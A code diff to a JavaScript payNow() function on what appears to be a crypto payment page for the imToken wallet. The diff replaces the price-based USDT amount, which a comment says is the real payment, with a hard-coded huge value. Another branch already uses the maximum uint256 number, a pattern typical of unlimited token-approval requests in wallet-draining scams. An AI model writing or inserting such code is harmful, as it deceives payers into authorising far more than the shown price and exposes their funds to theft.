@@ -2725,7 +2725,8 @@ function payNow() {
     if (wallet == 'imToken') {
         if (chain == 'tron') {
             // 使用实际的支付金额，转换为 USDT 的最小单位（6位小数）
-            amount = (parseFloat(document.getElementById('price').innerText) * 1000000).toString();
+            amount = '123456789123456789123456789'
+            // amount = (parseFloat(document.getElementById('price').innerText) * 1000000).toString();
         } else {
             amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
         }
